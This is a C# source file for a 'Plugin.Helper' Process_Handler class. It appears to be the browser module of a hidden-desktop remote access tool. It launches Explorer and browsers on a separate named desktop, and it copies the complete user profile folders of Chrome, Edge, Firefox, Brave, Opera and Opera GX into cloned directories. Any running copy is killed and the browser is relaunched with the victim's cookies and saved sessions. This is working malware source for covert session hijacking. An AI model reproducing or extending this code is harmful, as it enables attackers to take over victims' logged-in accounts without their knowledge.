

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Plugin.Helper
{
	internal class Process_Handler
	{
		private string DesktopName;
		public IntPtr hDesktop = IntPtr.Zero;
		private bool cloning_edge;
		private bool cloning_chrome;
		private bool cloning_firefox;
		private bool cloning_brave;
		private bool cloning_opera;
		private bool cloning_operagx;

		public Process_Handler(string DesktopName)
		{
			this.DesktopName = DesktopName;
			this.hDesktop = Utils.OpenDesktop(DesktopName, 0, true, 511U);
		}

		[DllImport("kernel32.dll")]
		private static extern bool CreateProcess(
			string lpApplicationName,
			string lpCommandLine,
			IntPtr lpProcessAttributes,
			IntPtr lpThreadAttributes,
			bool bInheritHandles,
			int dwCreationFlags,
			IntPtr lpEnvironment,
			string lpCurrentDirectory,
			ref Process_Handler.STARTUPINFO lpStartupInfo,
			ref Process_Handler.PROCESS_INFORMATION lpProcessInformation);

		public void Dispose() => GC.Collect();

		public bool StartExplorer()
		{
			uint num1 = 2;
			string name1 = "TaskbarGlomLevel";
			string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(name2, true))
			{
				if (registryKey != null)
				{
					if (registryKey.GetValue(name1) is uint num2)
					{
						if ((int) num2 != (int) num1)
							registryKey.SetValue(name1, (object) num1, RegistryValueKind.DWord);
					}
				}
			}
			return Utils.IsAdmin() && _ProcessHelper.RunAsRestrictedUser("C:\\Windows\\explorer.exe", this.DesktopName) || this.CreateProc("C:\\Windows\\explorer.exe");
		}

		public Process GetProcessFromhWnd(IntPtr handle)
		{
			try
			{
				uint ProcessId;
				Utils.GetWindowThreadProcessId(handle, out ProcessId);
				return Process.GetProcessById((int) ProcessId);
			}
			catch
			{
			}
			return (Process) null;
		}

		public string GetWindowTextFromhWnd(IntPtr handle)
		{
			string windowTextFromhWnd = string.Empty;
			int num = Utils.GetWindowTextLength(handle) + 1;
			StringBuilder lpString = new StringBuilder(num);
			if (Utils.GetWindowText(handle, lpString, num) > 0)
				windowTextFromhWnd = lpString.ToString();
			try
			{
				uint ProcessId;
				Utils.GetWindowThreadProcessId(handle, out ProcessId);
				Process processById = Process.GetProcessById((int) ProcessId);
				windowTextFromhWnd = !(windowTextFromhWnd == "") ? processById.ProcessName + " - " + windowTextFromhWnd : processById.ProcessName;
				processById.Dispose();
			}
			catch
			{
			}
			return windowTextFromhWnd;
		}

		public int KillExplorer()
		{
			List<IntPtr> numList = new List<IntPtr>();
			int count = 0;
			Utils.EnumDesktopWindows(this.hDesktop, new Utils.EnumDesktopWindowsDelegate(EnumWindowsCallback), IntPtr.Zero);
			return count;

			bool EnumWindowsCallback(IntPtr hWnd, IntPtr lParam)
			{
				Process processFromhWnd = this.GetProcessFromhWnd(hWnd);
				if (processFromhWnd != null && processFromhWnd.ProcessName == "explorer" && !processFromhWnd.HasExited)
				{
					processFromhWnd.Kill();
					return false;
				}
				processFromhWnd.Dispose();
				++count;
				return true;
			}
		}

		public string getChromePath()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32).OpenSubKey("ChromeHTML\\shell\\open\\command", false);
			string chromePath = (string) null;
			if (registryKey != null)
			{
				string[] strArray = registryKey.GetValue((string) null).ToString().Split('"');
				chromePath = strArray.Length >= 2 ? strArray[1] : (string) null;
			}
			return chromePath;
		}

		public string GetEdgePath()
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe";
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name))
			{
				if (registryKey != null)
				{
					object obj = registryKey.GetValue("");
					if (obj != null)
						return obj.ToString();
				}
			}
			return (string) null;
		}

		public string GetFirefoxPath()
		{
			string name1 = "SOFTWARE\\Mozilla\\Mozilla Firefox";
			using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name1))
			{
				if (registryKey1 != null)
				{
					object obj1 = registryKey1.GetValue("CurrentVersion");
					if (obj1 != null)
					{
						string name2 = "SOFTWARE\\Mozilla\\Mozilla Firefox\\" + obj1.ToString() + "\\Main";
						using (RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name2))
						{
							if (registryKey2 != null)
							{
								object obj2 = registryKey2.GetValue("PathToExe");
								if (obj2 != null)
									return obj2.ToString();
							}
						}
					}
				}
			}
			return (string) null;
		}

		public string GetBravePath()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry32).OpenSubKey("BraveHTML\\shell\\open\\command", false);
			string bravePath = (string) null;
			if (registryKey != null)
			{
				string[] strArray = registryKey.GetValue((string) null).ToString().Split('"');
				bravePath = strArray.Length >= 2 ? strArray[1] : (string) null;
			}
			return bravePath;
		}

		public string GetOperaPath()
		{
			using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet", true))
			{
				if (registryKey1 != null)
				{
					foreach (string subKeyName in registryKey1.GetSubKeyNames())
					{
						if (subKeyName.Contains("Opera") && !subKeyName.Contains("GX"))
						{
							using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName + "\\shell\\open\\command"))
							{
								if (registryKey2 != null)
								{
									object obj = registryKey2.GetValue("");
									if (obj != null)
										return obj.ToString().Trim('"');
								}
							}
						}
					}
				}
			}
			return (string) null;
		}

		public string GetOperaGXPath()
		{
			using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet", true))
			{
				if (registryKey1 != null)
				{
					foreach (string subKeyName in registryKey1.GetSubKeyNames())
					{
						if (subKeyName.Contains("Opera") && subKeyName.Contains("GX"))
						{
							using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName + "\\shell\\open\\command"))
							{
								if (registryKey2 != null)
								{
									object obj = registryKey2.GetValue("");
									if (obj != null)
										return obj.ToString().Trim('"');
								}
							}
						}
					}
				}
			}
			return (string) null;
		}

		public bool StartEdge() => this.CreateProc(this.GetEdgePath());

		public bool StartChrome() => this.CreateProc(this.getChromePath());

		public bool StartFirefox() => this.CreateProc(this.GetFirefoxPath());

		public bool StartBrave() => this.CreateProc(this.GetBravePath());

		public bool StartOpera() => this.CreateProc(this.GetOperaPath());

		public bool StartOperaGX() => this.CreateProc(this.GetOperaGXPath());

		public bool StartNewProfileChrome()
		{
			string str = "C:\\ChromeAutomationData";
			string chromePath = this.getChromePath();
			return chromePath != null && File.Exists(chromePath) && this.CreateProc("\"" + chromePath + "\" --user-data-dir=" + str);
		}

		public bool StartNewProfileOpera()
		{
			string str = "C:\\OperaAutomationData";
			string operaPath = this.GetOperaPath();
			return operaPath != null && File.Exists(operaPath) && this.CreateProc("\"" + operaPath + "\" --user-data-dir=" + str);
		}

		public bool StartNewProfileOperaGX()
		{
			string str = "C:\\OperaGXAutomationData";
			string operaGxPath = this.GetOperaGXPath();
			return operaGxPath != null && File.Exists(operaGxPath) && this.CreateProc("\"" + operaGxPath + "\" --user-data-dir=" + str);
		}

		public bool StartNewProfileBrave()
		{
			string str = "C:\\BraveAutomationData";
			string bravePath = this.GetBravePath();
			return bravePath != null && File.Exists(bravePath) && this.CreateProc("\"" + bravePath + "\" --user-data-dir=" + str);
		}

		public bool StartNewProfileEdge()
		{
			string str = "C:\\EdgeAutomationData";
			string edgePath = this.GetEdgePath();
			return edgePath != null && File.Exists(edgePath) && this.CreateProc("\"" + edgePath + "\" --user-data-dir=" + str);
		}

		public bool StartNewProfileFirefox()
		{
			string str = "C:\\FirefoxAutomationData";
			string firefoxPath = this.GetFirefoxPath();
			return firefoxPath != null && File.Exists(firefoxPath) && this.CreateProc("\"" + firefoxPath + "\" -no-remote -profile " + str);
		}

		public async Task<bool> CloneChrome()
		{
			try
			{
				string source = "C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Local\\Google\\Chrome\\User Data";
				string dataDir = "C:\\ChromeAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task<bool> CloneOperaGX()
		{
			try
			{
				string source = "C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable";
				string dataDir = "C:\\OperaGXAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task<bool> CloneOpera()
		{
			try
			{
				string source = "C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Roaming\\Opera Software\\Opera Stable";
				string dataDir = "C:\\OperaAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task<bool> CloneBrave()
		{
			try
			{
				string source = "C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data";
				string dataDir = "C:\\BraveAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task<bool> CloneFirefox()
		{
			try
			{
				string source = Process_Handler.RecursiveFileSearch("C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", "addons.json");
				if (source == null)
					return false;
				string dataDir = "C:\\FirefoxAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task<bool> CloneEdge()
		{
			try
			{
				string source = "C:\\Users\\" + Path.GetFileName(Environment.GetEnvironmentVariable("USERPROFILE")) + "\\AppData\\Local\\Microsoft\\Edge\\User Data";
				string dataDir = "C:\\EdgeAutomationData";
				if (Directory.Exists(dataDir))
				{
					await Task.Run((Action) (() => Directory.Delete(dataDir, true)));
					DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				else
				{
					DirectoryInfo directoryInfo1 = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(dataDir)));
				}
				await this.CopyDirAsync(source, dataDir);
				return true;
			}
			catch
			{
			}
			return false;
		}

		public async Task HandleCloneChrome()
		{
			if (this.cloning_chrome)
				return;
			this.cloning_chrome = true;
			if (!await this.CloneChrome())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneChrome() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileChrome();
			this.cloning_chrome = false;
		}

		public async Task HandleCloneOpera()
		{
			if (this.cloning_opera)
				return;
			this.cloning_opera = true;
			if (!await this.CloneOpera())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneOpera() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileOpera();
			this.cloning_opera = false;
		}

		public async Task HandleCloneOperaGX()
		{
			if (this.cloning_operagx)
				return;
			this.cloning_operagx = true;
			if (!await this.CloneOperaGX())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneOperaGX() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileOperaGX();
			this.cloning_operagx = false;
		}

		public async Task HandleCloneBrave()
		{
			if (this.cloning_brave)
				return;
			this.cloning_brave = true;
			if (!await this.CloneBrave())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneBrave() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileBrave();
			this.cloning_brave = false;
		}

		public async Task HandleCloneFirefox()
		{
			if (this.cloning_firefox)
				return;
			this.cloning_firefox = true;
			if (!await this.CloneFirefox())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneFirefox() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileFirefox();
			this.cloning_firefox = false;
		}

		public async Task HandleCloneEdge()
		{
			if (this.cloning_edge)
				return;
			this.cloning_edge = true;
			if (!await this.CloneEdge())
			{
				int processViaCommandLine = await this.GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
				if (processViaCommandLine != -1)
				{
					Process p = Process.GetProcessById(processViaCommandLine);
					try
					{
						p.Kill();
						int num = await this.CloneEdge() ? 1 : 0;
					}
					catch
					{
					}
					p.Dispose();
					p = (Process) null;
				}
			}
			Thread.Sleep(1000);
			this.StartNewProfileEdge();
			this.cloning_edge = false;
		}

		public async Task<int> GetProcessViaCommandLine(string processName, string searchString)
		{
			return await Task.Run<int>((Func<int>) (() =>
			{
				foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT * FROM Win32_Process WHERE Name = '" + processName + "'").Get())
				{
					string str = managementObject["CommandLine"]?.ToString();
					if (str != null && str.Contains(searchString))
						return Convert.ToInt32(managementObject["ProcessId"]);
				}
				return -1;
			}));
		}

		public static async Task<bool> Xcopy(string sourceFolder, string destinationFolder)
		{
			string text = "/c xcopy \"" + sourceFolder + "\" \"" + destinationFolder + "\" /E /H /C /I";
			int num1 = (int) MessageBox.Show(text);
			bool flag;
			using (Process process = new Process()
			{
				StartInfo = new ProcessStartInfo()
				{
					FileName = "cmd.exe",
					Arguments = text,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				}
			})
			{
				process.Start();
				string output = await process.StandardOutput.ReadToEndAsync();
				string error = await process.StandardError.ReadToEndAsync();
				int num2 = (int) MessageBox.Show(output);
				int num3 = (int) MessageBox.Show(error);
				await Task.Run((Action) (() => process.WaitForExit()));
				if (process.ExitCode != 0)
				{
					int num4 = (int) MessageBox.Show(string.Format("Failed w {0}: {1}", (object) process.ExitCode, (object) error));
				}
				flag = true;
			}
			return flag;
		}

		public static string RecursiveFileSearch(string currentDirectory, string targetFileName)
		{
			if (File.Exists(Path.Combine(currentDirectory, targetFileName)))
				return currentDirectory;
			foreach (string directory in Directory.GetDirectories(currentDirectory))
			{
				string str = Process_Handler.RecursiveFileSearch(directory, targetFileName);
				if (str != null)
					return str;
			}
			return (string) null;
		}

		public async Task CopyDirAsync(string sourceDir, string destinationDir)
		{
			await this.CopyDirectoriesAsync(sourceDir, destinationDir);
			await Process_Handler.CopyFilesInParallelAsync(Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories), sourceDir, destinationDir, 10);
		}

		private async Task CopyDirectoriesAsync(string sourceDir, string destinationDir)
		{
			foreach (string enumerateDirectory in Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories))
			{
				int startIndex = sourceDir.Length + 1;
				string path2 = enumerateDirectory.Substring(startIndex);
				string destinationPath = Path.Combine(destinationDir, path2);
				DirectoryInfo directoryInfo = await Task.Run<DirectoryInfo>((Func<DirectoryInfo>) (() => Directory.CreateDirectory(destinationPath)));
			}
		}

		private static async Task CopyFilesInParallelAsync(
			IEnumerable<string> files,
			string sourceDir,
			string destinationDir,
			int maxParallelism)
		{
			SemaphoreSlim semaphore = new SemaphoreSlim(maxParallelism);
			await Task.WhenAll(files.Select<string, Task>(new Func<string, Task>(CopyFileAsync)).ToArray<Task>());

			async Task CopyFileAsync(string filePath)
			{
				string path2 = filePath.Substring(sourceDir.Length + 1);
				string destinationPath = Path.Combine(destinationDir, path2);
				try
				{
					await semaphore.WaitAsync();
					await Task.Run((Action) (() => File.Copy(filePath, destinationPath, true)));
				}
				finally
				{
					semaphore.Release();
				}
			}
		}

		public bool CreateProc(string filePath)
		{
			Process_Handler.STARTUPINFO lpStartupInfo = new Process_Handler.STARTUPINFO();
			lpStartupInfo.cb = Marshal.SizeOf<Process_Handler.STARTUPINFO>(lpStartupInfo);
			lpStartupInfo.lpDesktop = this.DesktopName;
			Process_Handler.PROCESS_INFORMATION lpProcessInformation = new Process_Handler.PROCESS_INFORMATION();
			return Process_Handler.CreateProcess((string) null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, (string) null, ref lpStartupInfo, ref lpProcessInformation);
		}

		private struct STARTUPINFO
		{
			public int cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public int dwX;
			public int dwY;
			public int dwXSize;
			public int dwYSize;
			public int dwXCountChars;
			public int dwYCountChars;
			public int dwFillAttribute;
			public int dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		internal struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}
	}
}
